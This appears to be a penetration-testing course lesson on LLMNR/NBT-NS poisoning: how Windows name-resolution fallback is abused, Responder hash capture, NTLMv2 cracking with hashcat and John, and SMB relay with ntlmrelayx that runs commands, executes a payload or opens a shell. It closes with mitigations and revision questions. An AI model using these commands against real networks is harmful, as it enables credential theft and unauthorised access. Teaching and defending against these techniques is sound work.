# LLMNR/NBT-NS Poisoning

## Unit 3 - Topic 4 | Initial Access Scenarios

---

## Overview

**LLMNR (Link-Local Multicast Name Resolution)** and **NBT-NS (NetBIOS Name Service)** poisoning exploits Windows name resolution fallback mechanisms. When DNS fails to resolve a hostname, Windows broadcasts LLMNR/NBT-NS queries — an attacker on the same network can respond to capture NTLMv2 hashes.

---

## 1. How the Attack Works

```
NAME RESOLUTION ORDER IN WINDOWS:

1. Local hosts file     (C:\Windows\System32\drivers\etc\hosts)
2. DNS cache            (ipconfig /displaydns)
3. DNS server           (Configured DNS)
4. LLMNR                ← BROADCAST (Link-Local, multicast)
5. NBT-NS              ← BROADCAST (NetBIOS, broadcast)

ATTACK SCENARIO:
┌──────────┐                              ┌──────────┐
│  Victim  │  \\fileservr\share (typo!)   │ Attacker │
│  PC      │ ────────────────────────────→ │ Responder│
│          │                              │          │
│ 1. DNS lookup fails                     │          │
│ 2. LLMNR multicast:                     │          │
│    "Who is fileservr?"                  │          │
│          │ ──── LLMNR broadcast ──────→ │          │
│          │                              │ 3. "I am │
│          │ ←─── "That's me!" ────────── │ fileservr│
│          │                              │    !"    │
│ 4. Sends NTLMv2                         │          │
│    authentication                       │          │
│          │ ──── NTLMv2 hash ─────────→ │ 5. Hash  │
│          │                              │ captured!│
└──────────┘                              └──────────┘
```

---

## 2. Responder (Primary Tool)

```bash
# === BASIC USAGE ===
sudo responder -I eth0
# Listens on eth0 for LLMNR/NBT-NS queries
# Responds to ALL name resolution broadcasts

# === FULL FEATURES ===
sudo responder -I eth0 -wrf
# -w: Enable WPAD rogue proxy
# -r: Answer NBT-NS wredir queries
# -f: Fingerprint hosts (identify OS)

# === ANALYZE MODE (passive) ===
sudo responder -I eth0 -A
# Listens only, doesn't respond
# Good for recon — see what's being broadcasted

# === CAPTURED HASHES ===
# Stored in: /usr/share/responder/logs/
# Format: NTLMv2-SSP-10.0.0.50.txt
# Content:
# admin::CORP:challenge:NTLMv2Response:NTLMv2RestOfResponse

# === RESPONDER CONFIG ===
# /usr/share/responder/Responder.conf
# Enable/disable specific servers:
# [Responder Core]
# SQL = On/Off
# SMB = On/Off
# HTTP = On/Off
# HTTPS = On/Off
# DNS = On/Off
# LDAP = On/Off
# FTP = On/Off
```

---

## 3. Cracking Captured Hashes

```bash
# === NTLMv2 HASH CRACKING ===
# Hashcat (GPU-accelerated):
hashcat -m 5600 captured_hashes.txt wordlist.txt
# -m 5600: NTLMv2 mode

# With rules:
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule

# === JOHN THE RIPPER ===
john --format=netntlmv2 captured_hashes.txt \
  --wordlist=rockyou.txt

# === NTLMv1 vs NTLMv2 ===
# NTLMv1 (rare, weak):
hashcat -m 5500 ntlmv1_hashes.txt wordlist.txt
# Much easier to crack!
# Can be converted to NTLM hash directly (crack.sh)

# NTLMv2 (common, stronger):
hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt
# Requires strong wordlist + rules

# === FORCE NTLMv1 DOWNGRADE ===
# If you can modify Responder:
# Edit Responder.conf:
# [Responder Core]
# Challenge = 1122334455667788
# Then captured hashes can be cracked faster
```

---

## 4. SMB Relay (Alternative to Cracking)

```bash
# === INSTEAD OF CRACKING → RELAY ===
# If SMB signing is NOT required (common on workstations):

# Step 1: Identify targets without SMB signing:
crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt
# Generates list of hosts without SMB signing

# Step 2: Disable SMB/HTTP in Responder:
# Edit Responder.conf:
# SMB = Off
# HTTP = Off

# Step 3: Start Responder:
sudo responder -I eth0

# Step 4: Start ntlmrelayx:
ntlmrelayx.py -tf targets.txt -smb2support
# When victim authenticates → hash is relayed to target
# If victim is admin on target → command execution!

# Step 5: Execute commands:
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "whoami" --no-http-server

# Or dump SAM:
ntlmrelayx.py -tf targets.txt -smb2support \
  --no-http-server -e payload.exe

# Or interactive shell:
ntlmrelayx.py -tf targets.txt -smb2support -i
# Creates SOCKS proxy for interactive access
```

---

## 5. Defense Against LLMNR/NBT-NS

```
MITIGATION STRATEGIES:

1. DISABLE LLMNR (GPO):
   Computer Config → Admin Templates → Network →
   DNS Client → Turn off multicast name resolution
   → Enabled

2. DISABLE NBT-NS:
   Network adapter → TCP/IPv4 → Advanced → WINS →
   Disable NetBIOS over TCP/IP
   (Or via DHCP option)

3. ENABLE SMB SIGNING:
   Computer Config → Windows Settings → Security →
   Local Policies → Security Options →
   "Microsoft network server: Digitally sign
    communications (always)" = Enabled

4. NETWORK SEGMENTATION:
   ├── Isolate user VLANs
   ├── Limit broadcast domains
   └── Prevent attacker from being on same segment

5. MONITORING:
   ├── Detect Responder (unusual LLMNR responses)
   ├── Monitor for SMB relay patterns
   ├── Alert on NTLMv1 usage
   └── Track failed authentication spikes
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **LLMNR** | Multicast name resolution (fallback after DNS) |
| **NBT-NS** | NetBIOS name resolution (older fallback) |
| **Responder** | Primary tool for LLMNR/NBT-NS poisoning |
| **Hash type** | NTLMv2 (hashcat -m 5600) |
| **SMB relay** | Alternative when hashes are hard to crack |
| **Defense** | Disable LLMNR/NBT-NS, enable SMB signing |

---

## Quick Revision Questions

1. **What triggers LLMNR/NBT-NS queries?**
2. **What hash type does Responder capture?**
3. **When is SMB relay preferred over hash cracking?**
4. **How do you disable LLMNR via Group Policy?**
5. **Why is SMB signing important for relay defense?**

---

[← Previous: Password Spraying](03-password-spraying.md) | [Next: AS-REP Roasting →](05-asrep-roasting.md)

---

*Unit 3 - Topic 4 of 6 | [Back to README](../README.md)*
